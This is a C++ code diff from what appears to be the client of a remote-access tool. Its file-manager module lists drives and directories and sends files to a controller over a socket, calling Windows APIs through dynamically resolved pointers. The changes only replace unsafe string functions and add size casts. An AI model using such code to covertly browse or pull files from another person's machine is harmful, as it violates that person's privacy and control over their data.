@@ -28,28 +28,28 @@ std::vector<struct sDrives> Drives() {
 				UINT dt = cCliente->mod_dynamic->KERNEL32_FM.pGetDriveTypeA(p1);
 				switch (dt) {
 				case 0:
-					strncpy(cLabel, "Desconocido", 12);
+					strncpy_s(cLabel, "Desconocido", 12);
 					break;
 				case 1:
-					strncpy(cLabel, "Volumen no montado", 19);
+					strncpy_s(cLabel, "Volumen no montado", 19);
 					break;
 				case 2:
-					strncpy(cLabel, "USB", 5);
+					strncpy_s(cLabel, "USB", 5);
 					break;
 				case 3:
-					strncpy(cLabel, "Disco Duro", 11);
+					strncpy_s(cLabel, "Disco Duro", 11);
 					break;
 				case 4:
-					strncpy(cLabel, "Disco Remoto", 13);
+					strncpy_s(cLabel, "Disco Remoto", 13);
 					break;
 				case 5:
-					strncpy(cLabel, "CD-ROM", 7);
+					strncpy_s(cLabel, "CD-ROM", 7);
 					break;
 				case 6:
-					strncpy(cLabel, "RAM Disk", 9);
+					strncpy_s(cLabel, "RAM Disk", 9);
 					break;
 				default:
-					strncpy(cLabel, "Desconocido", 12);
+					strncpy_s(cLabel, "Desconocido", 12);
 					break;
 				}
 			}
@@ -59,16 +59,16 @@ std::vector<struct sDrives> Drives() {
 				cCliente->mod_dynamic->KERNEL32_FM.pGetDiskFreeSpaceExA(p1, (PULARGE_INTEGER)&FreeBytesAvaiableToUser, (PULARGE_INTEGER)&TotalFreeBytes, nullptr);
 				double dFreegigs = (((double)(FreeBytesAvaiableToUser / 1024) / 1024) / 1024);
 				double dTotalgigs = (((double)(TotalFreeBytes / 1024) / 1024) / 1024);
-				strncpy(sDrive.cLetter, p1, 10);
-				strncpy(sDrive.cLabel, cLabel, 50);
-				strncpy(sDrive.cType, cType, 20);
+				strncpy_s(sDrive.cLetter, p1, 10);
+				strncpy_s(sDrive.cLabel, cLabel, 50);
+				strncpy_s(sDrive.cType, cType, 20);
 				sDrive.dFree = dFreegigs;
 				sDrive.dTotal = dTotalgigs;
 			}
 			else {
-				strncpy(sDrive.cLetter, p1, 10);
-				strncpy(sDrive.cLabel, cLabel, 50);
-				strncpy(sDrive.cType, "-", 2);
+				strncpy_s(sDrive.cLetter, p1, 10);
+				strncpy_s(sDrive.cLabel, cLabel, 50);
+				strncpy_s(sDrive.cType, "-", 2);
 				sDrive.dFree = 0;
 				sDrive.dTotal = 0;
 			}
@@ -151,8 +151,9 @@ std::vector<std::string> vDir(c_char* cPath) {
 
 		snprintf(cFecha, 15, "%d/%d/%d", FileDate.wDay, FileDate.wMonth, FileDate.wYear);
 		
-		strncpy(cTmpdir, cPath, 2047);
-		strncat(cTmpdir, win32Archivo.cFileName, 2047 - strnlen(cTmpdir, 2047));
+		strncpy_s(cTmpdir, cPath, 2047);
+		size_t temp_len_dir = 2047 - strnlen(cTmpdir, 2047);
+		strncat_s(cTmpdir, temp_len_dir, win32Archivo.cFileName, temp_len_dir);
 		
 		stat(cTmpdir, &info);
 
@@ -322,7 +323,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 	
 	int iPaqueteTipo = EnumComandos::FM_Editar_Archivo_Paquete;
 	if (!isEdit) {
-		cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), strComando.size(), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_Init);
+		cCliente->cChunkSend(cCliente->sckSocket, strComando.c_str(), static_cast<int>(strComando.size()), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_Init);
 		std::this_thread::sleep_for(std::chrono::milliseconds(10));
 		iPaqueteTipo = EnumComandos::FM_Descargar_Archivo_Recibir;
 	}
@@ -330,8 +331,8 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 	std::string strHeader = cID;
 	strHeader.append(1, CMD_DEL);
 	
-	int iHeaderSize = strHeader.size();
-	int iBytesLeidos = 0;
+	size_t iHeaderSize = strHeader.size();
+	size_t iBytesLeidos = 0;
 
 	std::vector<char> nSendBuffer(PAQUETE_BUFFER_SIZE + iHeaderSize);
 	if (nSendBuffer.size() == 0) {
@@ -352,7 +353,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 		if (iBytesLeidos > 0) {
 			iBytesLeidos += iHeaderSize;
 			
-			int iEnviado = cCliente->cChunkSend(cCliente->sckSocket, nSendBuffer.data(), iBytesLeidos, 0, true, nullptr, iPaqueteTipo);
+			int iEnviado = cCliente->cChunkSend(cCliente->sckSocket, nSendBuffer.data(), static_cast<int>(iBytesLeidos), 0, true, nullptr, iPaqueteTipo);
 
 			uBytesEnviados += iEnviado;
 
@@ -370,7 +371,7 @@ void EnviarArchivo(const std::string& cPath, const std::string& cID, bool isEdit
 	//Ya se envio todo, cerrar el archivo
 	if (!isEdit) {
 		std::this_thread::sleep_for(std::chrono::milliseconds(500));
-		cCliente->cChunkSend(cCliente->sckSocket, cID.c_str(), cID.size(), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_End);
+		cCliente->cChunkSend(cCliente->sckSocket, cID.c_str(), static_cast<int>(cID.size()), 0, true, nullptr, EnumComandos::FM_Descargar_Archivo_End);
 	}
 }
 
